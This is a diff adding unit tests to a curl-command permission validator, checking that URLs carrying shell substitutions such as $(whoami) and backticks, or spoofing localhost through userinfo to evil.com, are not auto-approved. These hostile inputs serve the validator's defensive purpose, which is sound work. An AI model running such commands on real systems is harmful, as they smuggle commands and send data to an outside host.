@@ -332,6 +332,28 @@ class TestNotAllowed(unittest.TestCase):
         # -sX consumes the URL as the method value, leaving no URL → needs_local but no URL
         self.assertFallthrough('curl -sX https://example.com')
 
+    # -- shell expansion shlex.split() does not evaluate but bash does --
+
+    def test_command_substitution_in_url(self):
+        self.assertFallthrough('curl "https://api.wordpress.org/$(whoami)"')
+
+    def test_command_substitution_braced_var(self):
+        self.assertFallthrough('curl "https://api.wordpress.org/${HOME}"')
+
+    def test_backtick_substitution_in_url(self):
+        self.assertFallthrough('curl "https://api.wordpress.org/`whoami`"')
+
+    def test_bare_variable_in_url(self):
+        self.assertFallthrough('curl https://api.wordpress.org/$HOME')
+
+    # -- userinfo host spoofing of the local-only guard --
+
+    def test_userinfo_spoof_delete(self):
+        self.assertFallthrough('curl -X DELETE "http://localhost:1@evil.com/api"')
+
+    def test_userinfo_spoof_post_data(self):
+        self.assertFallthrough('curl -d "foo=bar" http://localhost:9@evil.com/collect')
+
 
 class TestEdgeCases(unittest.TestCase):
 
